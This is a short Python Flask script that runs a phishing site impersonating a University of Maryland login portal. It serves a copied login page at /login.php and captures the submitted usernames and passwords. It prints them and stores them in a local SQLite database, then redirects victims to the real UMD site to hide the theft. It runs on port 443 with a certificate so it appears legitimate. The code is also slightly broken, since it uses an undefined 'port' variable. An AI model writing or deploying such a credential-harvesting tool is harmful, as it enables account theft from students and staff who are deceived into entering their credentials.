from flask import Flask, render_template, request, redirect
import pandas as pd
import sqlalchemy

#University of Maryland
engine = sqlalchemy.create_engine('sqlite:///credentials.db')
app = Flask(__name__)

@app.route('/login.php', methods=['GET']) #login.php 
def login_page():
    return render_template('Login to Portal.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('uname')
    password = request.form.get('upass')
    print(username, password)
    
    df = pd.DataFrame({
        'username': [username],
        'password': [password]
    })
    
    df.to_sql('users', engine, if_exists='append', index=False)
    
    return redirect("https://advancement.umd.edu/index.php?msg=2")

if __name__ == '__main__':
    #app.run(debug=True)
    pem_file = 'website.pem' #cert file
    key_file = 'website.key'

    print(f'goto: localhost:{port}/login.php')
    app.run(port=443, ssl_context=(pem_file, key_file))
